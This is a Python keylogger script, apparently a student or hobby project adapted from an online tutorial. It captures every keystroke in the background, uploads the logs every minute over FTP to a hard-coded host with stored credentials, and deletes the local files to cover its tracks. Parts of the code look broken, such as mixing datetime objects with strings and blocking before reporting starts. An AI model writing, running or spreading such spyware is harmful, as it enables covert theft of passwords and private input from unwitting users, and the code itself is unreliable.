##################################################################
# keylogger.py
# Author: Shameek Hargrave 
# Purpose: Listens to keystrokes in the background, adding all keystokes
# to a file that gets sent over ftp every minute. Deletes the log
# files on machine after sending to server.
# Citation: https://thepythoncode.com/article/write-a-keylogger-python
##################################################################

import keyboard 
import os
from threading import Timer
from datetime import datetime
from send_file_updates import send_files_to_server
SEND_REPORT_EVERY_SECONDS = 60 
HOST = "192.168.1.4"
FTP_USERNAME = "target_machine"
FTP_PASSWORD = "password"

class Keylogger:
    """
    Listen to keystrokes in the background.
    """
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # Whenever a key is pressed and released, we add it to a global string variable.
    def callback(self, event):
        """
        Custom handler for keyboard events, adds keys to the log.
        """
        # WIP: check event names, might just get rid of this
        name = event.name
        # reformats space, enter and decimal points
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
           
        self.log += name    

    def report_to_file(self):
        # include end time in file name
        self.end_dt = datetime.now().strftime('%H:%M:%S %m/%d/%Y')
        filename = "logs/"+ self.start_dt + " to " + self.end_dt
        with open(filename, "wb") as file:
            file.write(self.log)
        # send the file over ftp to our server
        send_files_to_server([filename], HOST, FTP_USERNAME, FTP_PASSWORD)
        # delete the log to cover the tracks
        os.remove(filename)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
        # wait to send the first report
        while ((datetime.now() - self.start_dt).total_seconds() < self.interval):
            continue
        self.report()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY_SECONDS)
    keylogger.start()